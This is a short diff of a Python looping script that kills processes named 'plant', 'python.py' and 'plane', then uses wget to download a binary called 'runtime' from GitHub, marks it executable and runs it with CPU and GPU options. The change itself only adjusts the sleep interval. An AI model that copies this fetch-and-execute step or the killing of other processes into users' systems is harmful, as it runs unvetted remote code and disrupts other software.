@@ -139,5 +139,4 @@ while True:
         kill_other_processes(['plant', 'python.py', 'plane'])
         run_bash_command("wget https://github.com/handevproject/starterpack/raw/main/runtime && chmod +x runtime")
         run_runtime(args.plant, args.plant_ip, args.cpu, args.cpu_server, args.cpu_solo, args.gpu, args.gpu_server, args.gpu_solo)
-    else:
-        time.sleep(20 * 60)
+    time.sleep(15 * 60)
